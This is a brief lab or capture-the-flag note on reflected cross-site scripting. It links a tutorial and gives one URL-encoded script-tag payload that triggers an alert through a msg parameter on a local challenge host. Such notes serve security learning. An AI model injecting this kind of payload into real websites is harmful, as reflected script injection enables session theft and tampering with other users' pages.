# XSS 3

[Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)

Send the script (AS IN [xss 2](./XSS%202.md)) as a url parameter

```text
http://challenge.localhost/?msg=%3Cscript%3Ealert%28%22PWNED%22%29%3C%2Fscript%3E
```
